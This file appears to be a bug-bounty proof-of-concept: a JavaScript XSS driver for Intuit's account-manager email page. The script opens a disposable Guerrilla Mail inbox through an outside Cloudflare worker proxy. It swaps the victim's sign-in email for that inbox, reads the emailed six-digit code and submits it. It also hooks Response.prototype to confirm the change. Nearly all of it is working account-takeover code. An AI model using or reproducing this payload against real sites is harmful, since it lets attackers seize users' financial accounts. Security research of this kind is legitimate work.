/*
 * P59 - top-level XSS driver for the native Account Manager email flow.
 *
 * Load this only through the side-effect-only returnUrl loader after the real
 * /app/account-manager/security/email page has hydrated.  It deliberately
 * avoids iframes and raw Identity API calls so the Web Shell token consumer,
 * Authn remediation store, and Account Manager's cached transport all remain
 * in their native top-level lifecycle.
 */
(async function p59TopLevelNativeEmail() {
  "use strict";

  var PROXY = "https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=";
  var GUERRILLA = "https://api.guerrillamail.com/ajax.php";
  var PANEL_ID = "p59-native-email-proof";
  var RUN_FLAG = "__p59NativeEmailRunning";
  var responseRestore = null;

  function panel() {
    var root = document.getElementById(PANEL_ID);
    if (root) return root;
    root = document.createElement("section");
    root.id = PANEL_ID;
    root.style.cssText =
      "position:fixed;right:16px;bottom:16px;z-index:2147483647;" +
      "width:min(480px,calc(100vw - 32px));padding:14px;" +
      "border:3px solid #2ca01c;border-radius:9px;background:#111;" +
      "color:#7cff6b;font:14px/1.45 ui-monospace,monospace;" +
      "box-shadow:0 10px 36px rgba(0,0,0,.38);white-space:pre-wrap";
    root.textContent = "P59 top-level native email proof\nSTART";
    (document.body || document.documentElement).appendChild(root);
    return root;
  }

  function status(value) {
    var safe = String(value).replace(/[^A-Z0-9_:\-.@]/gi, "_").slice(0, 180);
    panel().textContent += "\n" + safe;
    document.title = "P59:" + safe;
  }

  function showCandidate(address) {
    var line = document.createElement("div");
    line.style.cssText = "margin-top:8px;color:#fff;word-break:break-all";
    line.textContent = "Candidate sign-in email: " + address;
    panel().appendChild(line);
  }

  function sleep(ms) {
    return new Promise(function (resolve) {
      setTimeout(resolve, ms);
    });
  }

  function waitFor(selector, timeoutMs) {
    return new Promise(function (resolve, reject) {
      var current = document.querySelector(selector);
      if (current) return resolve(current);
      var observer = new MutationObserver(function () {
        var node = document.querySelector(selector);
        if (!node) return;
        clearTimeout(timer);
        observer.disconnect();
        resolve(node);
      });
      var timer = setTimeout(function () {
        observer.disconnect();
        reject(new Error("TIMEOUT_" + selector));
      }, timeoutMs);
      observer.observe(document.documentElement, { childList: true, subtree: true });
    });
  }

  function waitEnabled(button, timeoutMs) {
    var started = Date.now();
    return new Promise(function (resolve, reject) {
      (function poll() {
        if (!button.disabled && button.getAttribute("aria-disabled") !== "true") {
          return resolve();
        }
        if (Date.now() - started > timeoutMs) {
          return reject(new Error("CONTROL_REMAINED_DISABLED"));
        }
        setTimeout(poll, 100);
      })();
    });
  }

  function waitInputValue(selector, timeoutMs, predicate) {
    var started = Date.now();
    return new Promise(function (resolve, reject) {
      (function poll() {
        var input = document.querySelector(selector);
        if (
          input &&
          input.isConnected &&
          !input.disabled &&
          typeof input.value === "string" &&
          predicate(input.value)
        ) {
          return resolve(input);
        }
        if (Date.now() - started > timeoutMs) {
          return reject(new Error("INPUT_VALUE_TIMEOUT_" + selector));
        }
        setTimeout(poll, 100);
      })();
    });
  }

  function nextPaint() {
    return new Promise(function (resolve) {
      requestAnimationFrame(function () {
        requestAnimationFrame(resolve);
      });
    });
  }

  function nativeSet(input, value) {
    var proto =
      input instanceof HTMLTextAreaElement
        ? HTMLTextAreaElement.prototype
        : HTMLInputElement.prototype;
    var descriptor = Object.getOwnPropertyDescriptor(proto, "value");
    if (!descriptor || typeof descriptor.set !== "function") {
      throw new Error("NO_NATIVE_SETTER");
    }
    descriptor.set.call(input, value);
    input.dispatchEvent(new Event("input", { bubbles: true }));
    input.dispatchEvent(new Event("change", { bubbles: true }));
  }

  function proxyGet(url) {
    return fetch(PROXY + encodeURIComponent(url), {
      method: "GET",
      cache: "no-store",
      credentials: "omit",
    }).then(function (response) {
      if (!response.ok) throw new Error("PROXY_HTTP_" + response.status);
      return response.text();
    });
  }

  async function createMailbox() {
    var raw = await proxyGet(GUERRILLA + "?f=get_email_address");
    var data = JSON.parse(raw);
    if (!data.email_addr || !data.sid_token) throw new Error("MAILBOX_CREATE_FAILED");
    return { address: data.email_addr, sid: data.sid_token };
  }

  async function waitForOtp(mailbox) {
    for (var attempt = 1; attempt <= 60; attempt += 1) {
      var raw = await proxyGet(
        GUERRILLA +
          "?f=check_email&seq=0&sid_token=" +
          encodeURIComponent(mailbox.sid),
      );
      var list = (JSON.parse(raw).list || []).filter(function (message) {
        return !/welcome to guerrilla/i.test(message.mail_subject || "");
      });
      if (list.length) {
        var messageRaw = await proxyGet(
          GUERRILLA +
            "?f=fetch_email&email_id=" +
            encodeURIComponent(list[0].mail_id) +
            "&sid_token=" +
            encodeURIComponent(mailbox.sid),
        );
        var message = JSON.parse(messageRaw);
        var body = String(message.mail_body || "").replace(/<[^>]*>/g, " ");
        var match = body.match(/\b(\d{6})\b/);
        if (match) return match[1];
      }
      if (attempt % 5 === 0) status("OTP_WAIT_" + attempt);
      await sleep(3000);
    }
    throw new Error("OTP_TIMEOUT");
  }

  function observeCredentialResult(timeoutMs) {
    var originalJson = Response.prototype.json;
    var originalText = Response.prototype.text;
    var settled = false;
    var resolveResult;
    var promise = new Promise(function (resolve) {
      resolveResult = resolve;
    });

    function inspect(value) {
      if (settled || !value || typeof value !== "object") return;
      var result = value.data && value.data.identityCreateOrReplaceEmailCredential;
      if (!result || !result.__typename) return;
      settled = true;
      restore();
      resolveResult({
        typename: result.__typename,
        status: typeof result.status === "string" ? result.status : "",
      });
    }

    var timer = setTimeout(function () {
      if (settled) return;
      settled = true;
      restore();
      resolveResult({ typename: "RESULT_NOT_OBSERVED", status: "" });
    }, timeoutMs);

    function restore() {
      Response.prototype.json = originalJson;
      Response.prototype.text = originalText;
      clearTimeout(timer);
    }

    Response.prototype.json = async function () {
      var value = await originalJson.apply(this, arguments);
      inspect(value);
      return value;
    };
    Response.prototype.text = async function () {
      var value = await originalText.apply(this, arguments);
      try {
        inspect(JSON.parse(value));
      } catch (_) {}
      return value;
    };

    responseRestore = restore;
    return promise;
  }

  try {
    if (top !== self) throw new Error("TOP_LEVEL_REQUIRED");
    if (location.origin !== "https://accounts.intuit.com") {
      throw new Error("WRONG_ORIGIN");
    }
    if (location.pathname.indexOf("/app/account-manager/security/email") !== 0) {
      throw new Error("WRONG_ACCOUNT_MANAGER_ROUTE");
    }
    if (window[RUN_FLAG]) throw new Error("DUPLICATE_RUN");
    window[RUN_FLAG] = true;
    panel();

    var emailInput = await waitInputValue(
      "#ius-email-address-update",
      60000,
      function (value) {
        return value.indexOf("@") > 0;
      },
    );
    var saveButton = await waitFor("#ius-email-update-btn-save", 15000);
    status("NATIVE_TOP_LEVEL_HOST_READY");

    // The returnUrl loader is invoked only after the host has mounted.  Keep a
    // short extra settle window for the shell token consumer and cached AM
    // transport before starting the native remediation.
    await sleep(5000);
    var resultPromise = observeCredentialResult(240000);

    var mailbox = await createMailbox();
    showCandidate(mailbox.address);
    status("MAILBOX_READY");
    nativeSet(emailInput, mailbox.address);
    emailInput.blur();
    await nextPaint();
    await waitEnabled(saveButton, 15000);
    status("EMAIL_COMMITTED_TO_NATIVE_FORM");
    saveButton.click();
    status("NATIVE_SAVE_CLICKED");

    var otpInput = await waitFor(
      '#ius-mfa-confirm-code,input[data-testid="VerifyOtpInput"],[data-testid="VerifyOtpInput"] input',
      90000,
    );
    var otpButton = await waitFor('[data-testid="VerifyOtpSubmitButton"]', 30000);
    status("NATIVE_OTP_WIDGET_READY");

    var otp = await waitForOtp(mailbox);
    status("OTP_RECEIVED");
    nativeSet(otpInput, otp);
    otp = "";
    otpInput.blur();
    await nextPaint();
    await waitEnabled(otpButton, 15000);
    otpButton.click();
    status("NATIVE_OTP_SUBMITTED");

    var result = await resultPromise;
    status(result.typename + (result.status ? ":" + result.status : ""));
    if (result.typename === "Identity_CreateOrReplaceEmailCredentialSuccess") {
      window.__P59_PROOF__ = {
        candidateEmail: mailbox.address,
        resultType: result.typename,
        status: result.status,
        observedAt: new Date().toISOString(),
      };
      status("XSS_SIGNIN_EMAIL_CREDENTIAL_ACCEPTED");
      await waitInputValue(
        "#ius-email-address-update",
        30000,
        function (value) {
          return value === mailbox.address;
        },
      );
      status("UI_CONFIRMED_SIGNIN_EMAIL_CHANGED");
    }
  } catch (error) {
    if (responseRestore) responseRestore();
    window[RUN_FLAG] = false;
    status("ERROR:" + (error && error.message ? error.message : "UNKNOWN"));
  }
})();
